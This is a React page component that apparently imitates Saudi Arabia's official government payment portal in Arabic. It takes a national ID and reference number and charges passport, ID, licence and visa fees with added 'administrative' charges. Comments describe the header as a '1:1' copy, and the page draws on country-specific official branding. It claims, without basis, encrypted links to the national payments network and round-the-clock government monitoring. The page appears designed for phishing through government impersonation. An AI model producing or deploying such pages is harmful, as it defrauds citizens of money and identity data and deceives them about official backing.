import React, { useState, useEffect } from 'react';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Button } from '@/components/ui/button';
import {
  Shield,
  FileText,
  CreditCard,
  CheckCircle2,
  Landmark,
  Lock,
  ArrowRight,
  Info,
  ShieldCheck,
  AlertCircle
} from 'lucide-react';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { formatCurrency } from '@/lib/countryCurrencies';
import BackButton from '@/components/BackButton';
import BottomNav from '@/components/BottomNav';

const GovernmentPayment = () => {
  const [selectedService, setSelectedService] = useState('passport');
  const [amount, setAmount] = useState(350);
  const [nationalId, setNationalId] = useState('');
  const [reference, setReference] = useState('');

  const govSystem = getGovernmentPaymentSystem('SA'); // Defaulting to SA for this page

  const services = [
    { id: 'passport', name: 'تجديد جواز السفر', fee: 300, adminFee: 50 },
    { id: 'id', name: 'بطاقة الهوية الوطنية', fee: 100, adminFee: 25 },
    { id: 'license', name: 'رخصة القيادة', fee: 400, adminFee: 50 },
    { id: 'visa', name: 'تأشيرة زيارة', fee: 600, adminFee: 100 },
  ];

  useEffect(() => {
    const service = services.find(s => s.id === selectedService);
    if (service) {
      setAmount(service.fee + service.adminFee);
    }
  }, [selectedService]);

  const currentService = services.find(s => s.id === selectedService);

  return (
    <div className="min-h-screen bg-[#F8FAFC] pb-24" dir="rtl" style={{ fontFamily: govSystem.fonts.primaryAr }}>
      {/* Official Government Header 1:1 */}
      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: govSystem.colors.primary }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             <div className="w-12 h-12 rounded-xl flex items-center justify-center text-white shadow-lg shadow-gray-200" style={{ background: govSystem.colors.primary }}>
                <Landmark className="w-6 h-6" />
             </div>
             <div>
                <h1 className="text-xl font-black text-gray-800">بوابة الدفع الحكومية الموحدة</h1>
                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{govSystem.nameEn} DIGITAL PAYMENT GATEWAY</p>
             </div>
          </div>
          <div className="hidden md:flex items-center gap-4">
             <div className="flex items-center gap-2 px-4 py-2 bg-green-50 text-green-700 rounded-full text-xs font-black">
                <ShieldCheck className="w-4 h-4" /> اتصال آمن ومشفر
             </div>
          </div>
          {govSystem.logo && <img src={govSystem.logo} className="h-10 w-auto object-contain" alt="" />}
        </div>
      </header>

      <div className="container mx-auto px-4 py-12">
        <div className="max-w-5xl mx-auto grid lg:grid-cols-3 gap-10">
          {/* Main Form Area */}
          <div className="lg:col-span-2 space-y-8">
             <div className="space-y-2 text-center lg:text-right">
                <h2 className="text-3xl font-black text-gray-800">سداد المستحقات والرسوم</h2>
                <p className="text-gray-500 font-bold text-lg">يرجى إكمال البيانات التالية بدقة لضمان تنفيذ العملية</p>
             </div>

             <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white">
                <form className="space-y-8">
                   <div className="space-y-6">
                      <div className="space-y-2">
                         <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">نوع الخدمة المطلوبة</Label>
                         <Select value={selectedService} onValueChange={setSelectedService}>
                            <SelectTrigger className="h-16 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white transition-all">
                               <SelectValue placeholder="اختر الخدمة..." />
                            </SelectTrigger>
                            <SelectContent className="rounded-2xl border-2">
                               {services.map(s => <SelectItem key={s.id} value={s.id} className="h-14 font-bold">{s.name}</SelectItem>)}
                            </SelectContent>
                         </Select>
                      </div>

                      <div className="space-y-2">
                         <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم الهوية الوطنية / الإقامة</Label>
                         <Input
                           placeholder="XXXXXXXXXX"
                           value={nationalId}
                           onChange={(e) => setNationalId(e.target.value)}
                           className="h-16 border-2 rounded-2xl font-black text-2xl text-center bg-gray-50 focus:bg-white transition-all tracking-[0.2em]"
                           maxLength={10}
                         />
                      </div>

                      <div className="space-y-2">
                         <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">الرقم المرجعي (اختياري)</Label>
                         <div className="relative group">
                            <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-400 group-focus-within:text-blue-600 transition-colors" />
                            <Input
                              placeholder="أدخل رقم المرجع إذا وجد"
                              value={reference}
                              onChange={(e) => setReference(e.target.value)}
                              className="h-16 pr-14 border-2 rounded-2xl font-black text-xl bg-gray-50 focus:bg-white transition-all"
                            />
                         </div>
                      </div>
                   </div>

                   {/* Dynamic Amount Display 1:1 */}
                   <div className="bg-[#fcfcfc] border-2 border-dashed border-gray-200 rounded-[2rem] p-8 space-y-6 animate-in fade-in zoom-in duration-500">
                      <div className="flex items-center gap-3">
                         <Info className="w-5 h-5 text-blue-600" />
                         <h4 className="text-sm font-black text-gray-800 uppercase tracking-widest">تفاصيل الرسوم المطبقة</h4>
                      </div>
                      <div className="space-y-4">
                         <div className="flex justify-between items-center text-sm font-bold">
                            <span className="text-gray-400">رسوم الخدمة الأساسية:</span>
                            <span className="text-gray-700">{formatCurrency(currentService?.fee || 0, 'SAR')}</span>
                         </div>
                         <div className="flex justify-between items-center text-sm font-bold">
                            <span className="text-gray-400">رسوم المعالجة الإدارية:</span>
                            <span className="text-gray-700">{formatCurrency(currentService?.adminFee || 0, 'SAR')}</span>
                         </div>
                         <div className="border-t pt-4 flex justify-between items-center">
                            <span className="text-lg font-black text-gray-800">الإجمالي المستحق:</span>
                            <span className="text-3xl font-black text-blue-600">{formatCurrency(amount, 'SAR')}</span>
                         </div>
                      </div>
                   </div>

                   <Button
                     className="w-full h-20 rounded-[1.5rem] text-2xl font-black shadow-2xl transition-all hover:translate-y-[-4px] active:translate-y-[2px]"
                     style={{ background: govSystem.gradients.primary, boxShadow: `0 15px 40px -12px ${govSystem.colors.primary}50` }}
                   >
                     <CreditCard className="w-8 h-8 ml-4" /> المتابعة لعملية الدفع
                   </Button>
                </form>
             </Card>
          </div>

          {/* Sidebar Instructions */}
          <div className="space-y-8">
             <Card className="p-8 border-0 shadow-xl rounded-[2.5rem] bg-white">
                <h3 className="text-xl font-black text-gray-800 mb-6 flex items-center gap-3">
                   <AlertCircle className="w-6 h-6 text-amber-500" /> إرشادات هامة
                </h3>
                <div className="space-y-6 text-sm text-gray-500 font-bold leading-relaxed">
                   <div className="flex gap-4">
                      <div className="w-2 h-2 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>تأكد من إدخال رقم الهوية بشكل صحيح لضمان ربط السداد بملفك الشخصي.</p>
                   </div>
                   <div className="flex gap-4">
                      <div className="w-2 h-2 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>يتم إصدار إيصال دفع رسمي فور اكتمال العملية بنجاح.</p>
                   </div>
                   <div className="flex gap-4">
                      <div className="w-2 h-2 rounded-full bg-blue-600 mt-2 shrink-0" />
                      <p>في حال واجهت أي مشكلة، يرجى التواصل مع الدعم الفني عبر الرقم الموحد.</p>
                   </div>
                </div>
             </Card>

             <div className="p-8 bg-gradient-to-br from-[#1E293B] to-[#334155] rounded-[2.5rem] text-white shadow-xl relative overflow-hidden">
                <div className="relative z-10">
                   <Shield className="w-12 h-12 mb-4 text-blue-400" />
                   <h4 className="text-xl font-black mb-2">حماية حكومية متكاملة</h4>
                   <p className="text-xs opacity-60 leading-relaxed font-bold">
                      هذه البوابة مرتبطة مباشرة بالشبكة الوطنية للمدفوعات. جميع العمليات مشفرة ومراقبة على مدار الساعة.
                   </p>
                </div>
                <Lock className="absolute -bottom-6 -left-6 w-32 h-32 opacity-10" />
             </div>
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default GovernmentPayment;
